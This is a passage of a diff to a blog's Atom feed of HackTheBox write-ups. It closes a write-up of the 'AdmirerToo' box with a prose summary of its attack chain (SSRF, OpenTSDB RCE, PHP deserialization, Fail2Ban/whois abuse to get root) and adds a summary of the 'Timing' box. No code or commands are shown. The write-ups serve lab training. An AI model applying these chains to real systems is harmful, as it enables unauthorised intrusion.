-<p>The request hangs however, and I had to press <code class="language-plaintext highlighter-rouge">CTRL + C</code> to exit. After closing the fake whois server, my payload was executed, and I got a shell in the box as root;</p>
-
-<p><img src="/assets/img/20220215183848.png" alt="" /></p>
-
-<p>This is the <em>hard</em> box I managed to solve, and even though it took some nudges, I was very happy!!!</p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="summary">Summary</h3>
-<p><br /></p>
-
-<ul>
-  <li>Discovered port <strong>22</strong>, <strong>80</strong>, and <strong>4242</strong> (filtered) with <code class="language-plaintext highlighter-rouge">nmap</code></li>
-  <li>Found a subdomain <code class="language-plaintext highlighter-rouge">db.admirer-galley.htb</code>  running an instance of <em>Adminer</em>.</li>
-  <li>Exploited an <em>SSRF</em> flaw in <em>Adminer</em> to access the service on port <strong>4242</strong>.</li>
-  <li>Service on port <strong>4242</strong> (OpenTSDB) was found to be vulnerable to <strong>RCE</strong>, which gave me access to the box as the local user <strong>opentsdb</strong>.</li>
-  <li>Inside as <strong>opentsdb</strong>
-    <ul>
-      <li>Recovered a password in the configuration file of the one-click login plugin used by Adminer.</li>
-      <li>Gained access to the account of <strong>jennifer</strong> due to password reuse.</li>
-    </ul>
-  </li>
-  <li>Inside as <strong>jennifer</strong>
-    <ul>
-      <li>Setup a tunnel to an instance of <em>OpenCATS</em> running locally on port <strong>8080</strong>, and logged in as <strong>jennifer</strong>.</li>
-      <li>Exploited a PHP deserialization flaw to create files on the server as the user <strong>devel</strong>.</li>
-      <li><strong>devel</strong> has write access to <code class="language-plaintext highlighter-rouge">/usr/local/etc</code>, which I exploited to create <code class="language-plaintext highlighter-rouge">whois</code> config that queries my server.</li>
-      <li>Exploited the way <em>Fail2Ban</em> is calling <code class="language-plaintext highlighter-rouge">mail</code> with the output of whois lookups to gain code execution as <strong>root</strong>.</li>
-    </ul>
-  </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="adminer" /><category term="mysql" /><category term="php" /><category term="ssrf" /><category term="opentsdb" /><category term="rce" /><category term="opencats" /><category term="fail2ban" /><category term="whois" /><category term="object injection" /><category term="insecure deserialization" /><category term="phpggc" /><summary type="html"><![CDATA[AdmirerToo is a hard-rated linux box. It starts with an SSRF exploit on Adminer to access an instance of OpenTSDB on port 4242, which is vulnerable to RCE. This will give you a shell on the box as opentsdb, which you can use to extract credentials from a configuration file and gain access to the account of jennifer due to password reuse. An instance of OpenCATS is running locally on port 8080, which you can access by setting up an SSH tunnel. OpenCATS is running as the user devel, who has write permissions on the directory /usr/local/etc, and is vulnerable object injection that you can use to write files in the directory, and exploit the Fail2Ban service to gain code execution as root.]]></summary></entry></feed>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="bruteforce" /><category term="filter bypass" /><category term="static analysis" /><category term="php" /><category term="authentication bypass" /><category term="enumeration" /><category term="sql injection" /><category term="arbitrary file upload" /><category term="git" /><category term="suid" /><category term="cron" /><summary type="html"><![CDATA[Timing is a very nice medium-rated linux box that involves a bit of static analysis on PHP files. Foothold involves quite a few steps that start with an LFI vulnerability to read source code of the application to identify a broken authentication logic, an SQL injection flaw to elevate to the website admin, and then an RCE via file upload. User access is through a password reuse, which you recover from a previous git commit. Privesc targets a custom SUID script that runs a Java program, which allows you to write arbitrary files in any directory you can enter.]]></summary></entry></feed>
